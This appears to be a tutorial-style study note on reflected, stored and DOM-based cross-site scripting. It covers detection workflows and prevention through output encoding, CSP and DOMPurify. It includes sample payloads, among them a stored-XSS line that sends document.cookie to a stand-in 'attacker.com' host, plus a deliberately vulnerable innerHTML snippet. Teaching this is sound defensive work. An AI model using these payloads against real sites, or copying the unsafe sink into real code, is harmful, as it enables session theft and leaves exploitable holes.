# XSS (Cross-Site Scripting)

This is the type of attack that is the most common vulnerability found on almost every website, and it can actually be harmful if a malicious link is opened or the website is vulnerable to it.

## Types of XSS

- **Reflected XSS** => malicious script comes from the current HTTP request
- **Stored XSS** => malicious script comes from the website's database
- **DOM-based XSS** => vulnerability exists in the client-side code rather than the server-side code

---

## Reflected XSS

When a web app takes user input from an HTTP request (like a URL) and immediately sends it back in the response page without checking or cleaning it, an attacker can trick a user into clicking a bad link to run a malicious script.

**Normal flow:**
```
user input -> database fetched -> responded by the server and returns the search
```

**Attack flow:**
```
user input -> harmful code injection -> database fetched -> no sanitation of input -> code runs -> responded by the server and code runs in the browser
```

**Examples** (typed into an input box):
```html
<script>alert("hello")</script>
```
```html
<script>window.location.href="hacker.login.php"</script>
```

---

## Stored XSS

Stored (Persistent) XSS: malicious input is saved server-side (DB, file, queue) and later rendered to other users **without encoding** — no victim interaction needed beyond a normal page visit.

### 1. Classic Payload (old-school)

```html
<script>alert(document.cookie)</script>
```
Saved raw in DB → injected via `innerHTML` / unescaped templates → executes on load.

### 2. Modern Payload (frameworks/CSP era)

Targets attribute-breakout + event handlers, since frameworks auto-escape text bindings:

```html
"><img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
```
Fires only when the app uses an unsafe sink:
- React: `dangerouslySetInnerHTML`
- Vue: `v-html`
- Angular: `[innerHTML]` / `bypassSecurityTrustHtml`

### 3. Detection Workflow

1. **Map inputs** — comments, bio, filenames, headers (`User-Agent`, `Referer`), etc.
2. **Inject canary** — `XSSCANARY123`
3. **Trace output** — check admin panels, dashboards, public feeds
4. **Test encoding** — send `< > " '` and see if they come back raw or encoded

Tools: Burp Suite Scanner, OWASP ZAP.

### 4. Prevention

**Output encoding (primary defense):**

| Char | Encoded  |
|------|----------|
| `<`  | `&lt;`   |
| `>`  | `&gt;`   |
| `"`  | `&quot;` |
| `'`  | `&#x27;` |

**Safe DOM APIs:**
```js
// Bad
el.innerHTML = userInput;

// Good
el.textContent = userInput;
```

**CSP header:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self';
```

**Rich text needed?** Sanitize with a maintained library:
```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userInput);
```

---

## DOM-Based XSS — Quick Reference

Purely client-side vulnerability. The payload **never touches the server** — the server sends legit JS, and that script mishandles user input at runtime in the browser.

### 1. Core Concept: Source → Sink

- **Source**: attacker-controlled JS property, e.g. `location.search`, `location.hash`, `document.referrer`, `window.name`
- **Sink**: dangerous JS/DOM function that executes or renders raw input, e.g. `eval()`, `document.write()`, `innerHTML`

```
Source (attacker controls URL) → JS (unsafe processing) → Sink (executes payload)
```

### 2. Classic Payload (old-school)

**Vulnerable code:**
```js
let searchParams = new URLSearchParams(window.location.search);
let query = searchParams.get('search');
document.getElementById('result').innerHTML = "You searched for: " + query;
```

**Malicious link:**
```
https://vulnerable-site.com/page.html?search=<img src=x onerror=alert(document.domain)>
```
Server sends clean HTML → client JS reads the `search` param → writes it raw into `innerHTML` → `onerror` fires → executes, entirely client-side.

### 3. Modern Risk (frameworks/evasion)

Frameworks (React/Vue/Angular) auto-encode text bindings by default, but risk returns when devs:
- Use raw sinks for rich text/markdown rendering
- Read from `location.hash` (never sent to the server, so **no server log trace**) into `eval()` or a jQuery selector sink `$()`

### 4. Detection Workflow

1. **Source mapping** — grep client JS for `location.search`, `location.hash`, `document.referrer`, `window.name`
2. **Sink tracking** — grep for `innerHTML`, `outerHTML`, `document.write`, `eval`
3. **Canary injection** — put `DOMCANARY99` in a URL param
4. **DOM inspection** — check the **Elements panel** (live DOM), not "View Source" (only shows the raw server response), to see if the canary lands unencoded in an executable context

### 5. Prevention

**Avoid dangerous sinks:**
```js
// Bad
el.innerHTML = userInput;
eval(userInput);
document.write(userInput);

// Good
el.textContent = userInput;
```

**Sanitize if HTML is required:**
```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userInput);
```

**Frameworks:** let React/Vue render natively — avoid `dangerouslySetInnerHTML` / `v-html` unless the input is sanitized first.

---

## How to Check if XSS Is Possible

- Use `alert()` => it will pop up and show/verify that XSS is possible
  - Note: from Chrome version 92 (2021) onward, calling `alert()` from a cross-origin context has been restricted, so it may not always fire.
- Use `print()` => it will open the print dialog for the page, confirming the script ran and that XSS is possible

## Prevention

- Sanitize the input on both the client side and the server side
- Encode data on output
- Convert the input into text using special-character encoding so it no longer remains executable code and can't be run — it's just text now
- Use a Content Security Policy (CSP)
